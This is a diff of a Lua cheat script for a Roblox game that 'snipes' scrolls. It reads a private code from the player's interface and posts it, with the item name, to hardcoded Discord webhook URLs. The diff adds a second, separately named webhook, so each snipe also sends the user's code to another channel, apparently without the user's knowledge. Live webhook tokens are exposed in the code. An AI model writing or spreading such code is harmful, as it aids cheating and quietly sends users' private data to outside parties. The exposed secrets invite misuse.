@@ -208,7 +208,6 @@ local function log(name, message, hook)
  local data = game:HttpPost(api, game:GetService("HttpService"):JSONEncode(Body), false, "application/json")
  return data or nil
 end
-local wh = "https://discordapp.com/api/webhooks/756045703045709866/D4SClZ7YmAo3fMWJIiotKOxwhMLr31CFtPWIorJsKlX4Q-C1aRFGKnb6WTrN62m4YHJD"
 function SendMessage(Webhook, Message, Botname)
     if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
         return error("Send a valid URL");
@@ -233,7 +232,10 @@ function SendMessage(Webhook, Message, Botname)
     return Data or nil;
 end
 local monkeyzzz = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").private.Text
-       SendMessage("https://discordapp.com/api/webhooks/766006562380054528/oOWi34rOjuqYi4mi86ZssDCUXfZXMoJsRX-FHYwNjDUJf9iABLbvbPf2Q6OfYDR158SA", "***" .. name .. " sniped ".. v.Name .. "Code: "  .. monkeyzzz .. "***", "Logger")
+	local snipess = "https://discord.com/api/webhooks/766006562380054528/oOWi34rOjuqYi4mi86ZssDCUXfZXMoJsRX-FHYwNjDUJf9iABLbvbPf2Q6OfYDR158SA"
+	local flex = "https://discord.com/api/webhooks/766777831694270473/h-nHwLJqqybqMCMamh_QBaHMJYBX2PpwJCO1F5ia8bLGwUENlAi4gPdoxcrOXlgt4HT_"
+	SendMessage(flex, "***" .. " Sniped: ".. v.Name .. "Code: "  .. monkeyzzz .. "***", "Senpai and Hentai Winning")
+       SendMessage(snipess, "***" .. name .. " sniped ".. v.Name .. "Code: "  .. monkeyzzz .. "***", "Logger")
        game.StarterGui:SetCore("SendNotification", {
 Title = "scroll sniped";
 Text = "sniped: " ..  v.Name;
